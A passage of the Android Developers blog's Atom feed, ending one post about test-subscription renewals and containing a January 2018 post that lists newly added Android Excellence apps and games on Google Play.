&lt;a href="https://3.bp.blogspot.com/-ATPfHi2wUPg/Wl425ZCC9hI/AAAAAAAAE_c/w90zuc7epHYvHY4Yukl5uAiwncsLG5rigCLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img class="renewalsimg" border="0" src="https://3.bp.blogspot.com/-ATPfHi2wUPg/Wl425ZCC9hI/AAAAAAAAE_c/w90zuc7epHYvHY4Yukl5uAiwncsLG5rigCLcBGAs/s1600/image2.png" data-original-width="960" data-original-height="540" /&gt;&lt;/a&gt;

&lt;h2&gt;Grace period&lt;/h2&gt;

&lt;a href="https://1.bp.blogspot.com/-qGj6yVvX40M/Wl43IvSaAwI/AAAAAAAAE_g/mtKHVqxVXQ8sIlVO35xF2qHUMEziQFp8QCLcBGAs/s1600/image3.png" imageanchor="1" &gt;&lt;img class="renewalsimg" border="0" src="https://1.bp.blogspot.com/-qGj6yVvX40M/Wl43IvSaAwI/AAAAAAAAE_g/mtKHVqxVXQ8sIlVO35xF2qHUMEziQFp8QCLcBGAs/s1600/image3.png" data-original-width="960" data-original-height="540" /&gt;&lt;/a&gt;

&lt;h2&gt;Account hold&lt;/h2&gt;

&lt;a href="https://4.bp.blogspot.com/-mTHdfttXzuU/Wl43T3nU9YI/AAAAAAAAE_k/_jy1-XF0fNALMOlgj6IYPm6lblENCe6ZQCLcBGAs/s1600/image1.png" imageanchor="1" &gt;&lt;img class="renewalsimg" border="0" src="https://4.bp.blogspot.com/-mTHdfttXzuU/Wl43T3nU9YI/AAAAAAAAE_k/_jy1-XF0fNALMOlgj6IYPm6lblENCe6ZQCLcBGAs/s1600/image1.png" data-original-width="960" data-original-height="540" /&gt;&lt;/a&gt;

&lt;p&gt;
Don't forget to check the &lt;a
href="https://developer.android.com/google/play/billing/billing_testing.html"&gt;Testing
In-app Billing&lt;/a&gt; page for more details on testing your subscriptions. If you
still have questions, reach out through the comments or post your question on &lt;a
href="https://stackoverflow.com"&gt;Stackoverflow&lt;/a&gt; using the tag &lt;a
href="https://stackoverflow.com/questions/tagged/google-play"&gt;google-play&lt;/a&gt;.
&lt;/p&gt;
&lt;style&gt;

.renewals {
width: 100%;
border: 1px solid black;
}

.renewals td {
border: 1px solid black;
margin-left: 5px;
}

.renewalsimg {
width: 100%;
margin: 0;
border: 0;
padding: 10px 0;
}

&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=i63LC-Rff1U:KPLfvaM4atc:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=i63LC-Rff1U:KPLfvaM4atc:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=i63LC-Rff1U:KPLfvaM4atc:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/i63LC-Rff1U" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1576392998479627904"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/1576392998479627904"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/i63LC-Rff1U/faster-renewals-for-test-subscriptions.html" title="Faster Renewals for Test Subscriptions"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://3.bp.blogspot.com/-ATPfHi2wUPg/Wl425ZCC9hI/AAAAAAAAE_c/w90zuc7epHYvHY4Yukl5uAiwncsLG5rigCLcBGAs/s72-c/image2.png" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/faster-renewals-for-test-subscriptions.html</feedburner:origLink>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-6755709643044947179.post-7709517046066185354</id>
    <published>2018-01-11T08:56:00.000-08:00</published>
    <updated>2018-01-11T09:40:08.679-08:00</updated>
    <category scheme="http://www.blogger.com/atom/ns#" term="android developers"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="App"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Develop"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Featured"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Game"/>
    <category scheme="http://www.blogger.com/atom/ns#" term="Google Play"/>
    <title type="text">Android Excellence: Congratulations to the newly added apps and games</title>
    <content type="html">&lt;em&gt;Posted by Kacey Fahey, Developer Marketing, Google Play&lt;/em&gt; &lt;p&gt;Kicking off the new year, we're excited to welcome our latest group of Android Excellence &lt;a
href="https://play.google.com/store/apps/topic?id=campaign_editorial_3002b4f_android_excellence_apps&amp;hl=en"&gt;apps&lt;/a&gt; and &lt;a
href="https://play.google.com/store/apps/topic?id=campaign_editorial_3002b50_android_excellence_games&amp;hl=en"&gt;games&lt;/a&gt;. These awardees represent some of the best experiences and top performing apps and games on the Play Store and can be found with other great selections on the &lt;a
href="https://play.google.com/store/apps/topic?id=editors_choice&amp;hl=en"&gt;Editors' Choice&lt;/a&gt; page. &lt;/p&gt;&lt;a href="https://4.bp.blogspot.com/-zvrh2BwyZ2M/WlZ1AoHldaI/AAAAAAAAE8o/sp8n5QER3KEk1-rr4Q_NCVV5csH5MZImQCLcBGAs/s1600/image1.jpg" imageanchor="1" &gt;&lt;img class="Android110" border="0" src="https://4.bp.blogspot.com/-zvrh2BwyZ2M/WlZ1AoHldaI/AAAAAAAAE8o/sp8n5QER3KEk1-rr4Q_NCVV5csH5MZImQCLcBGAs/s1600/image1.jpg" data-original-width="1024" data-original-height="592" /&gt;&lt;/a&gt;  &lt;p&gt;If you're looking for some new apps, below are a few highlights. &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.baseapp.eyeem&amp;hl=en"&gt;EyeEm&lt;/a&gt;: A great photo editor app with a full suite of filters and tools to make your pictures shine. Learn style tips from their community and even sell your images through the EyeEm marketplace.&lt;br /&gt;
&lt;li&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.musixmatch.android.lyrify"&gt;Musixmatch&lt;/a&gt;: Check out Musixmatch's updated app while learning the lyrics to all your favorite songs. The app is compatible with many of the top music streaming services and you can even follow along with your Android Wear device or on the big screen with Chromecast support.&lt;br /&gt;
&lt;li&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.augmentra.viewranger.android"&gt;ViewRanger&lt;/a&gt;: Plan your next hiking adventure by discovering new routes and trail guides with ViewRanger. Check out the Skyline feature using your phone's camera to identify over 9 million sites across the world through augmented reality.&lt;/li&gt;&lt;br /&gt;
&lt;/ul&gt;&lt;p&gt;Here are a few of our favorite new games joining the collection. &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://play.google.com/store/search?q=Fire+Emblem+Heroes"&gt;Fire Emblem Heroes&lt;/a&gt;: Nintendo's popular strategy-RPG franchise is now reimagined for mobile. Fight battles, develop your heroes' skills, and try various gameplay modes for hours of exciting gameplay.&lt;br /&gt;
&lt;li&gt;&lt;a
href="https://play.google.com/store/apps/details?id=air.com.noodlecake.luminocity"&gt;Lumino City&lt;/a&gt;: Explore the charming papercraft style world in this award-winning puzzle adventure game. The beautiful scenery is all handcrafted.&lt;br /&gt;
&lt;li&gt;&lt;a
href="https://play.google.com/store/apps/details?id=es.brokenrul.oldmansjourney"&gt;Old Man's Journey&lt;/a&gt;: Gorgeous scenery, an immersive soundtrack, and deep emotion help you uncover the old man's life stories while you solve puzzles and shape the landscape to determine his future.&lt;/li&gt;&lt;br /&gt;
&lt;/ul&gt;&lt;p&gt;Congratulations to the newly added Android Excellence apps and games. &lt;/p&gt;&lt;table&gt;&lt;tr&gt;    &lt;td&gt;&lt;strong&gt;&lt;span style="text-decoration:underline;"&gt;New Android Excellence apps&lt;/span&gt;&lt;/strong&gt;    &lt;/td&gt;    &lt;td&gt;&lt;strong&gt;&lt;span style="text-decoration:underline;"&gt;New Android Excellence games&lt;/span&gt;&lt;/strong&gt;    &lt;/td&gt;   &lt;/tr&gt;
&lt;tr&gt;    &lt;td&gt;&lt;a
href="https://play.google.com/store/apps/details?id=io.onetap.app.receipts.uk"&gt;1tap&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.acorns.android"&gt;Acorns&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.airbnb.android"&gt;Airbnb&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.blinkhealth.blinkandroid"&gt;Blink Health&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.blinkslabs.blinkist.android"&gt;Blinkist&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.clue.android"&gt;Clue&lt;/a&gt; &lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.zya.ditty"&gt;Ditty&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.baseapp.eyeem"&gt;EyeEm&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=co.thefabulous.app"&gt;Fabulous&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.ifttt.ifttt"&gt;IFTTT&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.chaozh.iReader"&gt;iReader&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.journey.app"&gt;Journey&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.skysoft.kkbox.android"&gt;KKBOX&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.linkedin.android"&gt;LinkedIn&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=br.com.gerenciadorfinanceiro.controller"&gt;Mobills: Budget Planner&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.musixmatch.android.lyrify"&gt;Musixmatch&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.shpock.android"&gt;Shpock&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=de.stocard.stocard"&gt;Stocard&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.wevideo.mobile.android"&gt;Video Editor&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.augmentra.viewranger.android"&gt;ViewRanger&lt;/a&gt; &lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.yazio.android"&gt;YAZIO &lt;/a&gt; &lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.yopapp.yop"&gt;YOP&lt;/a&gt;    &lt;/td&gt;    &lt;td&gt;&lt;a
href="https://play.google.com/store/apps/details?id=co.yakand.agentaapuzzleindisguise"&gt;Agent A&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.kongregate.mobile.bitheroes.google"&gt;Bit Heroes&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.ninjakiwi.supermonkey"&gt;Bloons Supermonkey 2&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.cmplay.dancingline"&gt;Dancing Line&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.vng.android.mps.dead.zombie2"&gt;DEAD WARFARE: Zombie&lt;/a&gt; &lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=net.gogame.dragon"&gt;Dragon Project&lt;/a&gt; &lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.nintendo.zaba"&gt;Fire Emblem Heroes&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.tinyco.futurama"&gt;Futurama: Worlds of Tomorrow&lt;/a&gt; &lt;p&gt;&lt;a href="https://play.google.com/store/apps/details?id=com.droidhang.ad"&gt;Idle Heroes&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=zombie.survival.craft.z"&gt;Last Day on Earth: Survival&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.igg.android.lordsmobile"&gt;Lords Mobile&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=air.com.noodlecake.luminocity"&gt;Lumino City&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.gameloft.android.ANMP.GloftMVHM"&gt;Modern Combat Versus&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=es.brokenrul.oldmansjourney"&gt;Old Man's Journey&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.nextgames.android.twd"&gt;The Walking Dead No Man's Land&lt;/a&gt; &lt;p&gt;&lt;a
href="https://play.google.com/store/apps/details?id=com.tencent.warwings2"&gt;War Wings&lt;/a&gt;    &lt;/td&gt;   &lt;/tr&gt;
&lt;/table&gt;&lt;p&gt;Explore other great apps and games in the &lt;a
href="https://play.google.com/store/apps/topic?id=editors_choice"&gt;Editors' Choice&lt;/a&gt; section on Google Play and &lt;a
href="https://developer.android.com/distribute/best-practices/index.html"&gt;discover best practices&lt;/a&gt; to help you build quality apps and games for people to love. &lt;/p&gt;&lt;center&gt;&lt;p&gt;How useful did you find this blogpost? &lt;/p&gt;&lt;p&gt;&lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=1%E2%98%85+%E2%80%93+Not+at+all&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=2%E2%98%85+%E2%80%93+Not+very&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=3%E2%98%85+%E2%80%93+Somewhat&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=4%E2%98%85+%E2%80%93+Very&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;a
href="https://docs.google.com/forms/d/e/1FAIpQLScLTlzFd_aV-3rAdBqO1QxwCsuAcDCIM6fJFXyNcyf7zElVXg/viewform?usp=pp_url&amp;entry.753333049=5%E2%98%85+%E2%80%93+Extremely&amp;entry.2056663615&amp;entry.646747778=AndroidExcellencerefresh-10/27" style="color:gold;"&gt;★&lt;/a&gt; &lt;/p&gt;&lt;/center&gt;&lt;a href="https://4.bp.blogspot.com/-ZyQjDXvbpbs/WlZ3sy4v0RI/AAAAAAAAE80/o2jtSsGLM-E-_tY6HMRBCvxF7YKGzmhnwCLcBGAs/s1600/image2.png" imageanchor="1" &gt;&lt;img class="playlogo110" border="0" src="https://4.bp.blogspot.com/-ZyQjDXvbpbs/WlZ3sy4v0RI/AAAAAAAAE80/o2jtSsGLM-E-_tY6HMRBCvxF7YKGzmhnwCLcBGAs/s1600/image2.png" data-original-width="499" data-original-height="281" /&gt;&lt;/a&gt;  &lt;style&gt;

.Android110 {
max-width: 100%;
padding: 10px 0 10px 0;
border: 0;
margin: 0 !important;
}

.playlogo110 {
max-width: 30%;
padding: 0;
border: 0;
margin: 0 auto !important;
display: block;
}


&lt;/style&gt;&lt;div class="feedflare"&gt;
&lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=xAg5eLpz6b8:Ms_YnojM_44:yIl2AUoC8zA"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?d=yIl2AUoC8zA" border="0"&gt;&lt;/img&gt;&lt;/a&gt; &lt;a href="http://feeds.feedburner.com/~ff/blogspot/hsDu?a=xAg5eLpz6b8:Ms_YnojM_44:-BTjWOF_DHI"&gt;&lt;img src="http://feeds.feedburner.com/~ff/blogspot/hsDu?i=xAg5eLpz6b8:Ms_YnojM_44:-BTjWOF_DHI" border="0"&gt;&lt;/img&gt;&lt;/a&gt;
&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/blogspot/hsDu/~4/xAg5eLpz6b8" height="1" width="1" alt=""/&gt;</content>
    <link rel="edit" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7709517046066185354"/>
    <link rel="self" type="application/atom+xml" href="http://www.blogger.com/feeds/6755709643044947179/posts/default/7709517046066185354"/>
    <link rel="alternate" type="text/html" href="http://feedproxy.google.com/~r/blogspot/hsDu/~3/xAg5eLpz6b8/android-excellence-congratulations-to.html" title="Android Excellence: Congratulations to the newly added apps and games"/>
    <author>
      <name>Android Developers</name>
      <uri>http://www.blogger.com/profile/08588467489110681140</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif"/>
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://4.bp.blogspot.com/-zvrh2BwyZ2M/WlZ1AoHldaI/AAAAAAAAE8o/sp8n5QER3KEk1-rr4Q_NCVV5csH5MZImQCLcBGAs/s72-c/image1.jpg" height="72" width="72"/>
    <feedburner:origLink>http://android-developers.googleblog.com/2018/01/android-excellence-congratulations-to.html</feedburner:origLink>
  </entry>
</feed>
